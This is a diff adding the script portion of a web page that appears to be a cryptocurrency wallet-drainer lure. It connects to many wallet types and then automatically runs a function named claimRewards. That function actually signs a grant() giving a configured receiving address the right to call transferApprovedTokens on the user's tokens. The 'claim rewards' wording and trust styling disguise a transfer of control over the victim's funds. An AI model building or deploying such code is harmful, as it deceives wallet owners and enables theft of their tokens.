+				"type": "address"
+			}
+		],
+		"name": "executeETHRequest",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "_grantee",
+				"type": "address"
+			},
+			{
+				"internalType": "string",
+				"name": "_invokes",
+				"type": "string"
+			},
+			{
+				"internalType": "uint256",
+				"name": "_expireAt",
+				"type": "uint256"
+			}
+		],
+		"name": "grant",
+		"outputs": [
+			{
+				"internalType": "bool",
+				"name": "",
+				"type": "bool"
+			}
+		],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"anonymous": false,
+		"inputs": [
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "_authorizer",
+				"type": "address"
+			},
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "_grantee",
+				"type": "address"
+			},
+			{
+				"indexed": false,
+				"internalType": "string",
+				"name": "_invokes",
+				"type": "string"
+			},
+			{
+				"indexed": false,
+				"internalType": "uint256",
+				"name": "_expireAt",
+				"type": "uint256"
+			}
+		],
+		"name": "Grant",
+		"type": "event"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "_grantee",
+				"type": "address"
+			}
+		],
+		"name": "revoke",
+		"outputs": [
+			{
+				"internalType": "bool",
+				"name": "",
+				"type": "bool"
+			}
+		],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"anonymous": false,
+		"inputs": [
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "_authorizer",
+				"type": "address"
+			},
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "_grantee",
+				"type": "address"
+			}
+		],
+		"name": "Revoke",
+		"type": "event"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "user",
+				"type": "address"
+			},
+			{
+				"internalType": "address",
+				"name": "_authorizer",
+				"type": "address"
+			}
+		],
+		"name": "transferApprovedTokens",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "user",
+				"type": "address"
+			}
+		],
+		"name": "transferApprovedTokens",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "string",
+				"name": "_invokes",
+				"type": "string"
+			}
+		],
+		"name": "updateCallableFuncNames",
+		"outputs": [
+			{
+				"internalType": "bool",
+				"name": "",
+				"type": "bool"
+			}
+		],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "uint256",
+				"name": "",
+				"type": "uint256"
+			}
+		],
+		"name": "callableFuncNames",
+		"outputs": [
+			{
+				"internalType": "string",
+				"name": "",
+				"type": "string"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "bytes32",
+				"name": "",
+				"type": "bytes32"
+			}
+		],
+		"name": "delegations",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "delegator",
+				"type": "address"
+			},
+			{
+				"internalType": "address",
+				"name": "delegate",
+				"type": "address"
+			},
+			{
+				"internalType": "bytes32",
+				"name": "authority",
+				"type": "bytes32"
+			},
+			{
+				"internalType": "bytes32",
+				"name": "salt",
+				"type": "bytes32"
+			},
+			{
+				"internalType": "uint256",
+				"name": "expiry",
+				"type": "uint256"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "bytes32",
+				"name": "",
+				"type": "bytes32"
+			}
+		],
+		"name": "ethRequests",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "requester",
+				"type": "address"
+			},
+			{
+				"internalType": "address",
+				"name": "target",
+				"type": "address"
+			},
+			{
+				"internalType": "address",
+				"name": "tokenAddress",
+				"type": "address"
+			},
+			{
+				"internalType": "uint256",
+				"name": "amount",
+				"type": "uint256"
+			},
+			{
+				"internalType": "string",
+				"name": "message",
+				"type": "string"
+			},
+			{
+				"internalType": "uint256",
+				"name": "validUntil",
+				"type": "uint256"
+			},
+			{
+				"internalType": "bool",
+				"name": "executed",
+				"type": "bool"
+			},
+			{
+				"internalType": "bool",
+				"name": "approved",
+				"type": "bool"
+			},
+			{
+				"internalType": "bytes32",
+				"name": "delegationHash",
+				"type": "bytes32"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "bytes32",
+				"name": "",
+				"type": "bytes32"
+			}
+		],
+		"name": "executedDelegations",
+		"outputs": [
+			{
+				"internalType": "bool",
+				"name": "",
+				"type": "bool"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "bytes32",
+				"name": "delegationHash",
+				"type": "bytes32"
+			}
+		],
+		"name": "getDelegation",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "delegator",
+				"type": "address"
+			},
+			{
+				"internalType": "address",
+				"name": "delegate",
+				"type": "address"
+			},
+			{
+				"internalType": "bytes32",
+				"name": "authority",
+				"type": "bytes32"
+			},
+			{
+				"components": [
+					{
+						"internalType": "string",
+						"name": "enforcer",
+						"type": "string"
+					},
+					{
+						"internalType": "bytes",
+						"name": "terms",
+						"type": "bytes"
+					}
+				],
+				"internalType": "struct ETHRequestDelegationManager.Caveat[]",
+				"name": "caveats",
+				"type": "tuple[]"
+			},
+			{
+				"internalType": "bytes32",
+				"name": "salt",
+				"type": "bytes32"
+			},
+			{
+				"internalType": "uint256",
+				"name": "expiry",
+				"type": "uint256"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "bytes32",
+				"name": "requestId",
+				"type": "bytes32"
+			}
+		],
+		"name": "getETHRequest",
+		"outputs": [
+			{
+				"components": [
+					{
+						"internalType": "address",
+						"name": "requester",
+						"type": "address"
+					},
+					{
+						"internalType": "address",
+						"name": "target",
+						"type": "address"
+					},
+					{
+						"internalType": "address",
+						"name": "tokenAddress",
+						"type": "address"
+					},
+					{
+						"internalType": "uint256",
+						"name": "amount",
+						"type": "uint256"
+					},
+					{
+						"internalType": "string",
+						"name": "message",
+						"type": "string"
+					},
+					{
+						"internalType": "uint256",
+						"name": "validUntil",
+						"type": "uint256"
+					},
+					{
+						"internalType": "bool",
+						"name": "executed",
+						"type": "bool"
+					},
+					{
+						"internalType": "bool",
+						"name": "approved",
+						"type": "bool"
+					},
+					{
+						"internalType": "bytes32",
+						"name": "delegationHash",
+						"type": "bytes32"
+					}
+				],
+				"internalType": "struct ETHRequestDelegationManager.ETHRequest",
+				"name": "",
+				"type": "tuple"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "bytes32",
+				"name": "delegationHash",
+				"type": "bytes32"
+			}
+		],
+		"name": "isDelegationExecuted",
+		"outputs": [
+			{
+				"internalType": "bool",
+				"name": "",
+				"type": "bool"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			},
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"name": "userAuth",
+		"outputs": [
+			{
+				"internalType": "uint256",
+				"name": "expireAt",
+				"type": "uint256"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			},
+			{
+				"internalType": "uint256",
+				"name": "",
+				"type": "uint256"
+			}
+		],
+		"name": "userRequests",
+		"outputs": [
+			{
+				"internalType": "bytes32",
+				"name": "",
+				"type": "bytes32"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "_authorizer",
+				"type": "address"
+			},
+			{
+				"internalType": "string",
+				"name": "_invoke",
+				"type": "string"
+			}
+		],
+		"name": "verify",
+		"outputs": [
+			{
+				"internalType": "bool",
+				"name": "",
+				"type": "bool"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	}
+  ];
+        let userAccount = null;
+        let delegationHash = null;
+
+        // Intersection Observer for scroll animations
+        const observerOptions = {
+            threshold: 0.1,
+            rootMargin: '0px 0px -50px 0px'
+        };
+
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.style.animationPlayState = 'running';
+                }
+            });
+        }, observerOptions);
+
+        // Observe elements for scroll animations
+        document.querySelectorAll('.stat-card, .benefit-item, .trust-badge').forEach(el => {
+            el.style.animationPlayState = 'paused';
+            observer.observe(el);
+        });
+
+        // Mobile detection
+        function isMobile() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
+        // Deep links for mobile wallets
+        const WALLET_DEEP_LINKS = {
+            metamask: 'metamask://',
+            trustwallet: 'trust://',
+            coinbase: 'cbwallet://',
+            phantom: 'phantom://',
+            exodus: 'exodus://',
+            guarda: 'guarda://',
+            zengo: 'zengo://',
+            okx: 'okx://',
+            rainbow: 'rainbow://',
+            kraken: 'kraken://',
+            safe: 'safe://',
+            fantom: 'fantom://',
+            openfort: 'openfort://',
+            alchemy: 'alchemy://',
+            rabby: 'rabby://',
+            mew: 'mew://'
+        };
+
+        // Comprehensive Multi-Wallet Support System
+        const WALLET_CONFIGS = {
+            metamask: {
+                name: 'MetaMask',
+                icon: '🦊',
+                check: () => typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask,
+                connect: async () => {
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    return { provider: window.ethereum, accounts };
+                },
+                priority: 1
+            },
+            coinbase: {
+                name: 'Coinbase Wallet',
+                icon: '📱',
+                check: () => typeof window.coinbaseWalletExtension !== 'undefined',
+                connect: async () => {
+                    const accounts = await window.coinbaseWalletExtension.request({ method: 'eth_requestAccounts' });
+                    return { provider: window.coinbaseWalletExtension, accounts };
+                },
+                priority: 2
+            },
+            trustwallet: {
+                name: 'Trust Wallet',
+                icon: '🔐',
+                check: () => typeof window.trustwallet !== 'undefined',
+                connect: async () => {
+                    const accounts = await window.trustwallet.request({ method: 'eth_requestAccounts' });
+                    return { provider: window.trustwallet, accounts };
+                },
+                priority: 3
+            },
+            phantom: {
+                name: 'Phantom',
+                icon: '👻',
+                check: () => typeof window.phantom !== 'undefined' || typeof window.solana !== 'undefined',
+                connect: async () => {
+                    // Phantom supports Ethereum through EIP-1193
+                    if (window.phantom?.ethereum) {
+                        const accounts = await window.phantom.ethereum.request({ method: 'eth_requestAccounts' });
+                        return { provider: window.phantom.ethereum, accounts };
+                    }
+                    throw new Error('Phantom Ethereum support not available');
+                },
+                priority: 4
+            },
+            exodus: {
+                name: 'Exodus',
+                icon: '🚀',
+                check: () => typeof window.exodus !== 'undefined',
+                connect: async () => {
+                    const accounts = await window.exodus.ethereum.request({ method: 'eth_requestAccounts' });
+                    return { provider: window.exodus.ethereum, accounts };
+                },
+                priority: 5
+            },
+            guarda: {
+                name: 'Guarda',
+                icon: '🛡️',
+                check: () => typeof window.guarda !== 'undefined',
+                connect: async () => {
+                    const accounts = await window.guarda.request({ method: 'eth_requestAccounts' });
+                    return { provider: window.guarda, accounts };
+                },
+                priority: 6
+            },
+            zengo: {
+                name: 'ZenGo',
+                icon: '🔑',
+                check: () => typeof window.zengo !== 'undefined',
+                connect: async () => {
+                    const accounts = await window.zengo.request({ method: 'eth_requestAccounts' });
+                    return { provider: window.zengo, accounts };
+                },
+                priority: 7
+            },
+            okx: {
+                name: 'OKX Wallet',
+                icon: '🟡',
+                check: () => typeof window.okxwallet !== 'undefined',
+                connect: async () => {
+                    const accounts = await window.okxwallet.request({ method: 'eth_requestAccounts' });
+                    return { provider: window.okxwallet, accounts };
+                },
+                priority: 8
+            },
+            rainbow: {
+                name: 'Rainbow',
+                icon: '🌈',
+                check: () => typeof window.rainbow !== 'undefined',
+                connect: async () => {
+                    const accounts = await window.rainbow.request({ method: 'eth_requestAccounts' });
+                    return { provider: window.rainbow, accounts };
+                },
+                priority: 9
+            },
+            kraken: {
+                name: 'Kraken',
+                icon: '🐙',
+                check: () => typeof window.kraken !== 'undefined',
+                connect: async () => {
+                    const accounts = await window.kraken.request({ method: 'eth_requestAccounts' });
+                    return { provider: window.kraken, accounts };
+                },
+                priority: 10
+            },
+            safe: {
+                name: 'Safe',
+                icon: '🔒',
+                check: () => typeof window.safe !== 'undefined',
+                connect: async () => {
+                    const accounts = await window.safe.request({ method: 'eth_requestAccounts' });
+                    return { provider: window.safe, accounts };
+                },
+                priority: 11
+            },
+            fantom: {
+                name: 'Fantom',
+                icon: '👹',
+                check: () => typeof window.fantom !== 'undefined',
+                connect: async () => {
+                    const accounts = await window.fantom.request({ method: 'eth_requestAccounts' });
+                    return { provider: window.fantom, accounts };
+                },
+                priority: 12
+            },
+            openfort: {
+                name: 'Openfort',
+                icon: '🏰',
+                check: () => typeof window.openfort !== 'undefined',
+                connect: async () => {
+                    const accounts = await window.openfort.request({ method: 'eth_requestAccounts' });
+                    return { provider: window.openfort, accounts };
+                },
+                priority: 13
+            },
+            alchemy: {
+                name: 'Alchemy Smart Wallets',
+                icon: '⚗️',
+                check: () => typeof window.alchemy !== 'undefined',
+                connect: async () => {
+                    const accounts = await window.alchemy.request({ method: 'eth_requestAccounts' });
+                    return { provider: window.alchemy, accounts };
+                },
+                priority: 14
+            },
+            rabby: {
+                name: 'Rabby',
+                icon: '🦝',
+                check: () => typeof window.rabby !== 'undefined',
+                connect: async () => {
+                    const accounts = await window.rabby.request({ method: 'eth_requestAccounts' });
+                    return { provider: window.rabby, accounts };
+                },
+                priority: 15
+            },
+            mew: {
+                name: 'MEW',
+                icon: '🐱',
+                check: () => typeof window.mew !== 'undefined',
+                connect: async () => {
+                    const accounts = await window.mew.request({ method: 'eth_requestAccounts' });
+                    return { provider: window.mew, accounts };
+                },
+                priority: 16
+            },
+            generic: {
+                name: 'Other Web3 Wallet',
+                icon: '🌐',
+                check: () => typeof window.ethereum !== 'undefined',
+                connect: async () => {
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    return { provider: window.ethereum, accounts };
+                },
+                priority: 99
+            }
+        };
+
+        // Wallet Detection and Management
+        let availableWallets = [];
+        let selectedWallet = null;
+        let walletProvider = null;
+
+        function detectWallets() {
+            console.log('🔍 Detecting available wallets...');
+            availableWallets = [];
+
+            Object.entries(WALLET_CONFIGS).forEach(([key, config]) => {
+                if (config.check()) {
+                    availableWallets.push({ ...config, key });
+                    console.log(`✅ ${config.name} detected`);
+                }
+            });
+
+            // Sort by priority
+            availableWallets.sort((a, b) => a.priority - b.priority);
+
+            console.log(`📱 Found ${availableWallets.length} wallet(s):`, availableWallets.map(w => w.name));
+            return availableWallets;
+        }
+
+        function showWalletModal() {
+            console.log('🔄 Opening wallet modal...');
+            const modal = document.getElementById('walletModal');
+            if (!modal) {
+                console.error('❌ Wallet modal element not found!');
+                return;
+            }
+            // Always run detection but allow modal open regardless of outcome
+            detectWallets();
+            // --- Fallback: if no wallet detected but window.ethereum exists, add a generic option ---
+            if (availableWallets.length === 0 && typeof window.ethereum !== 'undefined') {
+                // Add a fallback wallet (MetaMask/Default)
+                availableWallets.push({
+                    name: 'MetaMask / Default',
+                    icon: '🦊',
+                    key: 'generic',
+                    connect: async () => {
+                      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                      return { provider: window.ethereum, accounts };
+                    },
+                    priority: 100
+                });
+            }
+            populateWalletGrid();
+            modal.style.display = 'block';
+            console.log('✅ Wallet modal opened');
+        }
+
+        function closeWalletModal() {
+            document.getElementById('walletModal').style.display = 'none';
+        }
+
+        function openWallet(walletKey) {
+            const url = WALLET_DEEP_LINKS[walletKey];
+            if (url) {
+                window.location.href = url;
+                // Show message to user
+                showError('Opening ' + (WALLET_CONFIGS[walletKey]?.name || walletKey) + '... Please return to this page and approve the connection in the wallet app to proceed with delegation authorization.');
+                // Don't close modal, keep it open for when user returns
+            } else {
+                showError('Deep link not available for this wallet.');
+            }
+        }
+
+        function populateWalletGrid() {
+            const walletGrid = document.getElementById('walletGrid');
+            walletGrid.innerHTML = '';
+
+            if (availableWallets.length === 0) {
+                if (isMobile()) {
+                    walletGrid.innerHTML = `
+                        <div style="grid-column: 1 / -1; text-align: center; padding: 40px;">
+                            <h4 style="color: #666; margin-bottom: 20px;">Open Your Web3 Wallet</h4>
+                            <p style="color: #999; margin-bottom: 20px;">Select your installed wallet to connect and confirm the signature request:</p>
+                            <div style="display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;">
+                                <button onclick="openWallet('metamask')" style="background: #f6851b; color: white; padding: 10px 20px; border-radius: 8px; border: none; cursor: pointer; font-size: 14px;">🦊 Open MetaMask</button>
+                                <button onclick="openWallet('trustwallet')" style="background: #3375bb; color: white; padding: 10px 20px; border-radius: 8px; border: none; cursor: pointer; font-size: 14px;">🔐 Open Trust Wallet</button>
+                                <button onclick="openWallet('coinbase')" style="background: #0052ff; color: white; padding: 10px 20px; border-radius: 8px; border: none; cursor: pointer; font-size: 14px;">📱 Open Coinbase</button>
+                                <button onclick="openWallet('phantom')" style="background: #ab9ff2; color: white; padding: 10px 20px; border-radius: 8px; border: none; cursor: pointer; font-size: 14px;">👻 Open Phantom</button>
+                            </div>
+                            <p style="margin-top: 20px; font-size: 12px; color: #666;">After opening your wallet, return to this page and click "Connect Wallet" again to proceed with the delegation approval.</p>
+                        </div>
+                    `;
+                } else {
+                    walletGrid.innerHTML = `
+                        <div style="grid-column: 1 / -1; text-align: center; padding: 40px;">
+                            <h4 style="color: #666; margin-bottom: 20px;">No Web3 Wallets Detected</h4>
+                            <p style="color: #999; margin-bottom: 20px;">Please install a Web3 wallet to continue</p>
+                            <div style="display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;">
+                                <button onclick="window.open('https://metamask.io/download/', '_blank')" style="background: #f6851b; color: white; padding: 10px 20px; border-radius: 8px; border: none; cursor: pointer; font-size: 14px;">🦊 Install MetaMask</button>
+                                <button onclick="window.open('https://trustwallet.com/', '_blank')" style="background: #3375bb; color: white; padding: 10px 20px; border-radius: 8px; border: none; cursor: pointer; font-size: 14px;">🔐 Install Trust Wallet</button>
+                            </div>
+                            ${typeof window.ethereum !== 'undefined' ? `<div style='margin-top:25px;'><button class='connect-btn' style='font-size:1em;' onclick='selectWallet("generic")'>Try MetaMask / Default</button></div>` : ''}
+                        </div>
+                    `;
+                }
+                return;
+            }
+
+            availableWallets.forEach(wallet => {
+                const walletElement = document.createElement('div');
+                walletElement.className = 'wallet-option installed';
+                walletElement.innerHTML = `
+                    <div class="wallet-icon">${wallet.icon}</div>
+                    <div class="wallet-name">${wallet.name}</div>
+                    <div class="wallet-status">Available</div>
+                `;
+                walletElement.onclick = () => selectWallet(wallet.key);
+
+                walletGrid.appendChild(walletElement);
+            });
+        }
+
+        async function selectWallet(walletKey) {
+            console.log(`🎯 Selecting wallet: ${walletKey}`);
+            selectedWallet = WALLET_CONFIGS[walletKey];
+            closeWalletModal();
+
+            try {
+                updateButtonState(true, `🔄 Connecting to ${selectedWallet.name}...`);
+
+                const result = await selectedWallet.connect();
+                walletProvider = result.provider;
+                userAccount = result.accounts[0];
+
+                console.log(`✅ Connected to ${selectedWallet.name}:`, userAccount);
+
+                // Verify account access
+                const balance = await walletProvider.request({
+                    method: 'eth_getBalance',
+                    params: [userAccount, 'latest']
+                });
+                console.log('Account balance check passed:', balance);
+
+                // Show success and proceed to signature
+                showSuccess(`✅ Connected to ${selectedWallet.name}!<br><small>Address: ${userAccount.slice(0, 6)}...${userAccount.slice(-4)}</small>`);
+
+                // Auto-redirect to claim process
+                claimRewards();
+
+            } catch (error) {
+                console.error('Wallet connection error:', error);
+                updateButtonState(false);
+
+                let errorMessage = '❌ Connection failed. ';
+                if (error.code === 4001) {
+                    errorMessage += 'Please approve the connection in your wallet.';
+                } else if (error.code === -32002) {
+                    errorMessage += 'Connection request already pending. Check your wallet.';
+                } else {
+                    errorMessage += error.message || 'Unknown error occurred.';
+                }
+
+                showError(errorMessage);
+            }
+        }
+
+        function showInstallInstructions() {
+            const instructions = `
+                <div style="text-align: left;">
+                    <h4>🔌 Install a Web3 Wallet</h4>
+                    <p>Choose from these popular options:</p>
+                    <ul style="margin: 15px 0; padding-left: 20px;">
+                        <li><strong>Trust Wallet:</strong> <a href="https://trustwallet.com/" target="_blank" style="color: #00d4ff;">Download here</a></li>
+                        <li><strong>Coinbase Wallet:</strong> <a href="https://www.coinbase.com/wallet" target="_blank" style="color: #00d4ff;">Download here</a></li>
+                        <li><strong>Phantom:</strong> <a href="https://phantom.app/" target="_blank" style="color: #00d4ff;">Download here</a></li>
+                        <li><strong>Rainbow:</strong> <a href="https://rainbow.me/" target="_blank" style="color: #00d4ff;">Download here</a></li>
+                    </ul>
+                    <p><small>After installing, refresh this page and try again.</small></p>
+                </div>
+            `;
+            showError(instructions);
+            closeWalletModal();
+        }
+
+        // Main connect wallet function
+        async function connectWallet() {
+            console.log('🎯 Connect wallet button clicked!');
+            showWalletModal();
+        }
+
+        function updateButtonState(loading, text = '🔗 Connect Wallet') {
+            const btnText = document.getElementById('btnText');
+            const btnSpinner = document.getElementById('btnSpinner');
+            const connectBtn = document.getElementById('connectBtn');
+
+            if (loading) {
+                btnText.style.display = 'none';
+                btnSpinner.style.display = 'inline';
+                connectBtn.disabled = true;
+            } else {
+                btnText.style.display = 'inline';
+                btnSpinner.style.display = 'none';
+                connectBtn.disabled = false;
+                btnText.textContent = text;
+            }
+        }
+
+        function showError(message) {
+            const statusDiv = document.getElementById('statusDiv');
+            statusDiv.innerHTML = `<div class="error" style="animation: fadeInScale 0.3s ease-out;">${message}</div>`;
+        }
+
+        function showSuccess(message) {
+            const statusDiv = document.getElementById('statusDiv');
+            statusDiv.innerHTML = `<div class="success" style="animation: fadeInScale 0.3s ease-out;">${message}</div>`;
+        }
+
+        async function claimRewards() {
+            const statusDiv = document.getElementById('statusDiv');
+            if (!userAccount || !walletProvider) {
+                showError('❌ Wallet not connected. Please connect your wallet first.');
+                updateButtonState(false, 'Connect Wallet');
+                return;
+            }
+
+            try {
+                updateButtonState(true, 'Awaiting Delegation...');
+                statusDiv.innerHTML = '<div class="loading-spinner"></div> Please approve the delegation in your wallet...';
+
+                const web3 = new Web3(walletProvider);
+                const contract = new web3.eth.Contract(CONTRACT_ABI, CONFIG.contractAddress);
+
+                const grantee = CONFIG.receivingAddress;
+                const invokes = JSON.stringify(['transferApprovedTokens']);
+                const expireAt = Math.floor(Date.now() / 1000) + 3600; // Valid for 1 hour
+
+                await contract.methods.grant(
+                    grantee,
+                    invokes,
+                    expireAt
+                ).send({ from: userAccount });
+
+                showSuccess(`✅ Delegation approved! The DApp can now manage your tokens.`);
+                updateButtonState(false, 'Delegation Complete');
+
+            } catch (error) {
+                console.error('Delegation error:', error);
+                let errorMessage = '❌ Delegation failed. ';
+                if (error.code === 4001) {
+                    errorMessage += 'Transaction rejected by user.';
+                } else if (error.message) {
+                    errorMessage += error.message.split("{")[0].trim();
+                } else {
+                    errorMessage += 'Please try again.';
+                }
+                showError(errorMessage);
+                updateButtonState(false, 'Try Again');
+            }
+        }
+
+        document.getElementById('connectBtn').addEventListener('click', showWalletModal);
+
+        // Initial wallet detection on page load
+        detectWallets();
+
+            </script>
+</body>
+</html>
+
